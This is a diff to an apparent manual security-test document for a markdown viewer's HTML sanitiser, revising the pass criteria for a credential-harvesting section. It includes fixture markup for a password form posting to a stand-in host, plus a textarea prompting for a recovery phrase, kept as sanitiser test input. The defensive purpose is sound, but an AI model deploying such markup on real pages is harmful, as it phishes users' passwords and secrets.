@@ -80,26 +80,48 @@ Two things to know before reading, or you will misjudge a pass:
 
 ## Credential harvesting
 
-> **EXPECT:** at most the inert words *Sign in* as plain text — no box to
-> type in, and nothing that depresses or highlights when clicked.
-> **FAIL IF:** you see a **text field** you can click into, or a **button**
-> that behaves like one. That is the whole test: if a document you merely
-> opened can put a password field on screen, it can ask you for a password.
-> Seeing either means this build must not be used.
+> **EXPECT:** no box you can click into and type in. A *Sign in* button may
+> render and may depress when clicked — it does nothing, because there is no
+> form behind it and no script can run.
+> **FAIL IF:** you see a **text field** that takes a cursor, or typing into
+> anything on this page produces characters. That is the whole test: if a
+> document you merely opened can put a password field on screen, it can ask
+> you for a password.
 >
-> The leftover text is expected. `<form>`, `<input>` and `<button>` are all
-> removed, but DOMPurify's `KEEP_CONTENT` default preserves the text inside a
-> stripped element, so the button's label survives with nothing behind it.
+> Also FAIL IF you see a dropdown, a resizable multi-line box, or a
+> checkbox that is not part of a task list — each of those is a control the
+> sanitiser is supposed to remove.
+>
+> `<form>` and every input except task-list checkboxes are removed. `<button>`
+> is deliberately **not** removed: the app emits its own buttons into this same
+> article HTML (the Mermaid zoom controls, the code-copy control), so
+> forbidding the tag deletes the app's own UI. Forbidding it is what broke the
+> Mermaid controls in 1.0.4 and 1.0.5. A document-authored button is left inert
+> rather than removed.
+>
+> Leftover text is expected: DOMPurify's `KEEP_CONTENT` default preserves the
+> text inside a stripped element, so a removed control's label survives with
+> nothing behind it.
 >
 > This section is why the automated test was not enough on its own: it
-> asserted `<form>` count was zero, which was true while an input and a button
-> rendered anyway — the form was unwrapped and its children kept. It now
-> counts the controls.
+> asserted `<form>` count was zero, which was true while an input rendered
+> anyway — the form was unwrapped and its children kept. It now counts the
+> controls themselves.
 
 <form action="https://example.invalid/collect" method="post">
   <input name="password" type="password">
   <button type="submit">Sign in</button>
 </form>
+
+Every other control the sanitiser removes, so that a change to the forbidden
+list cannot pass unnoticed:
+
+<label for="pw">Account password</label>
+<select name="target"><option>Choose an account</option></select>
+<textarea name="notes" rows="3">Paste your recovery phrase</textarea>
+<fieldset><legend>Billing</legend><output name="total">0.00</output></fieldset>
+<datalist id="suggestions"><option value="admin"></option></datalist>
+<input type="text" name="username" list="suggestions">
 
 ## Document-level hijacking
 
